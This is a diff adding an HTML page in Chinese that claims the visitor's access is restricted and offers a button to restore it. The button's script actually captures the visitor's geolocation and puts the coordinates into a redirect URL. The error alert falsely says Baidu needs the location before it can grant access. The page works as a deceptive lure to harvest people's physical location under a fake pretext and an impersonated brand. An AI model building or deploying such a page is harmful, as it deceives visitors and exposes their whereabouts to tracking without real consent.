@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>您的访问受到限制</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    </head>
+<body>
+    <div class="header" align="center">
+        <div style="width: 100%;height: 100px"></div>
+        <div class="logo"></div>
+        <p style="color: red">您的访问受到限制!</p>
+        <br />
+        <table>
+            <td>
+                <p>点击下方</p>
+            </td>
+            <td>
+                <h5>申请恢复访问</h5>
+            </td>
+            <td>
+                即可申请恢复访问
+            </td>
+        </table>
+        <div style="width: 100%;height: 200px"></div>
+        <button class="btn" onclick="get_location()">申请恢复访问</button>
+    </div>
+</body>
+<style>
+    .logo{
+        width: 300px;
+        height: 70px;
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQgAAAA6CAMAAAB77TffAAAA21BMVEVHcEwAAAAAAAAAAAAAAAAAAAAMrf8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA30P+Hpc8AAAAAAAAcuv8tx/8Rsf9g0/IAAAAtyP8nw/860v8fuv4Usv8Rsf82z/8kv/8vyf9A2P8cqfhLsuk3yv31T3Q91f/7YHqCrtDwfIqjgK3/V3PdV4GVgLSzaZwAAAAHqf881P8Us/9B1/830P8xzP8kwf8qxv//eoP/Tm8buf//R2z/V3P/Ynj/bX1ej9G6mK/FcZhdcvL6AAAANnRSTlMARfBiG7j++zZUiTwrA+ScENPFfkokHBGrc+lMqgVIaimTN13Wsn/H6Zj+7v3TX/nx97D3ZL122yGKAAAIq0lEQVRo3u2bB3viOBCGjbHprhRTTOgQIHU3S0lxQvr//0WnbtkWYAK5vUsyuzwrsONFr74ZjUaKJP3Yj+1g3c7g9HgxHQ1alW9ModI5vl4sFjc3t8C8Uav5PTE4w+NrjoPn3Y0a35FDG2DwQXjQ7u7c7yeKBuFw4wsC2sj5bhyufT3c3Hq3hMNq1Xe+oV9EBLECNvoXvKOqAst+yqMtGZgd9+7m8TUfIBgHSGI5jvGAciaeFcQ/np4Bq4muaFq8B5trvpgCnzzLxQXRuWaCmHYa7Uq3NfCIIJarZTfGkKbjmYruLqghg6MmW6EPc1xPtlpAThb3P6KrkW+wLn9gHBZDEBKQL7QHBMRy6R4aRD5W39SPg9hwox1LEMf84A+JIJbLxoFBJD8ZhPxBEDRC3Czagc+HWBDLlHtgELVPBpHecKMeZ+pshS6MsCBSqY8ES+ioujhYIkXY6hbjYkRxU5wsRUDo8PE1bLlijRl0GWuzZ5yfAxCn4YmyCyhMXl+Xqe7u05YJBbAmWqMYkYn3HCXSze13wA4b5KJuKb5ut7jG6ds9sPOIICSpv7x8eHg4eW3tDiILQRxtBZG1gGlcr+D7/MFAmKCpl+OCOL9HNmlHrgwhh4fHk/HuIAzAQda2gkjOgEObG3q1FwjNRmEhEw9E8wKDeIumkL0nBOLxTxxfyAZMBiDs4EdKEIQCPzNgM+nfg+JoDrbMQygiieKmXIoDoulgDvcX0WtXmMPj7xgg8lunjFIQRHbzPJDnu2lCj1GhwAxLB0HYMtB4w0/NjTGihEhU4ymCgLiPXjojIH79bRBSjvS2gBJF8ALzTxZnzxwIJYkMzhoqbiaLIKmwSBs6Cm6LM3LsGi/3kXWmdoY5/AdAKGk8mga9bOCBTys8iDyhNCO4hG3Yiq55Ko3WkMSIl7PI1V8ExJ9hr+EcGkTGAIaimeFbFaVSsFUORgBEII95YAIJwiMEIpYVwjXKU7jsfiOKCI+75hAOj68wq3J7za0gjhSx5QUg/NwqzqyBfELFHoJ9QiU92htEpQOrDwAEmT5fIpKggjiBHID1e9tArMuSynuDkFQaHSxNg0FApmn4viAaqPoAC1JTLIiXlwsnEiqRIN4BCIhiPnedzwBRS9bgX/gqrgXBOpnkFiv5IAjNhJZBWTlqAnp6wqQGWdqoxSU4Q4wBFmJu3jCHEImrE98zUtjm8377E0CwGEYimjihssmqCXQCSYLOhRER1VisRYFFZvmtKpg+O4sFI3EzwZ7x8vJ84XvHH5JMgSwCLUGxJOap9meBEC8l/W6W8EVUyCridkkEwtQJLpjnI8JJfKEg+ykFtdbimoKApbk3iAG+np9/nUFVOGcnjAMOlYQD0ITzl0DgeouMAoqJIoQlDCsGV/fLywSeQYtVyWCt9hoJgpGYEkHAP9CeoFEQ71QPhIR7SBCZnMAKYhAGV1ixZyx7DILQDB8XeFeA8khnWf5hBZc/IwQCcZgOOp3B9ByBwByenp4JBuIYfXfs9n1JzBsHBLHLMjyOIkr2LFgIViz0joCQM5FKDAYxxfubzd4l4xASxMMYB4W2m5oTEP31IIyi2HJiENpa2xIjyLRxFAZRlme+VMhEYueommZ2OVR5ohxGbMu7iUlACgEOJ1f+UpQqQiyJnTPLjVXWow/OGnkYCdSA/tGbEhiNWkZQtEauccrHvfMXTg8PBMTvK35RTjiIo8Rng8hweQQLsZlIjKiBtamd22R+uGyREmWwVluZvD/7isAFmctgjc4lIOp/A4SfWUqaRVOOagTE0dasUmZfeUA4DEKphYdQMEGcXE5Ctco2lUR3HQh5nUVBFEiBAH41/kb8SVm81jC4tQZylfI+IE4JiJCrdz3Pm5y/4xDx+/J1VY/0t09A9PabNVBHFDbXzQx/sZFF0c4vMwZXn4kyWn3aaPV5FF197gjimIAIHQ5q0qMAk8lktboTcJDGBERrPxAo5mvEpVHHEyQpxBKxo6swBTsF1dCaegQFoUOTA600aqUDOxs0RIRTxCkAQbY8wUvAQRoSEOP9QOS4cTkiEx4QiJbEk4GhRfOIQIVqtq5CRUGUg7hzrPsq2zjaqIg7rAhkIg6HUoTNL34UFQu2mMChU04KEirTAsNpw15VdViz1KuoZgk+DNcsBSC0HBSEAMSaGNH2iCLgcYC6cG3lHiRGmOngTn2N36tUlf02eHZRBJ01OiHdezRIAD0IOTipbbNGLBAoC0jwV20WyJL77nTtooghTagCvuHUIQasCDEHFiJSzl4goAtwez9ayWCSSNu1nRVR/rAi2uRwTDCR6HhMEZhDxe33h3yXu6mtmWW2ILYSByLLn2Exk9XwJr5VLMQCYeJHZ6r+Ek4pFJDcSvACiq/oFjj16qiFohP4V2HREq81OhHH8BiHdh2eCuAqUu06XXX19sksUd0EzHqakqgZll9wN4q6v3evFrMFcwuIIr/Zr7EBj2VVmmMvsN0MSD8rA48KwiN+MVqhgyJ10utmj60+684+IAz8RcyAEPQinD6zwY7U4oMoSR8C0TwmigB/B61GozW49Tx0xhQognBwVuTg0LI/7jV64z4rR8xbe+1rHIGBlxVuq2amG3kaMZSa7WeAZmwQOeljIKSGX6kjxbpbogivTiKoQw4OrUh9askqVP3mfhs8io3qZQquJ9rFfLBopCQNnetdDBB6oDq7Ewhcu11wGPAZU6AHNpP0mSRQ7ZZxWFe9NRPbjCbOGp4jc2oumREfHChni1WSZ2vwJxXhtImfmueKLZlETGPhuDniqticInwOUoOdJWOK2FCo+9+aMwhwwBHCG/GZRY9y4BWR6klfzJodutHlkwjuY2ndOuBAJYFjRL0rfT1rnDJFIAzTyGBX3BUTxHIOQIy/6An11siPEeLf12m7dbbNlRq3pS9rlVZnMBoNOut/g6vZGLpu33WHXenHYElc034o/NiXtn8AYpWJT0qV9H4AAAAASUVORK5CYII=);
+        background-repeat: no-repeat;
+        background-size: 100% 100%;
+    }
+    .btn{
+        width: 300px;
+        height: 50px;
+        background-color: #00bfff;
+        border-radius: 10px;
+        color: white;
+        border: none;
+    }
+</style>
+<script>
+    function get_location(){
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    let getLongitude = position.coords.longitude;
+                    let getLatitude = position.coords.latitude;
+                    console.log(getLongitude) ;
+                    console.log(getLatitude) ;
+                    list_location = [
+                        'Longitude:' + getLongitude ,
+                        'Latitude:' + getLatitude ,
+                    ] ;
+                    window.location.href = "locationInfo="+list_location ;
+                },
+                //on error
+                function(error) {
+                    var errorType = ['百度需要您的位置信息才可以进行服务访问', '位置信息不可用', '获取信息超时'];
+                    alert(errorType[error.code - 1]);
+                }
+            );
+        } ;
+    }
+</script>
+</html>
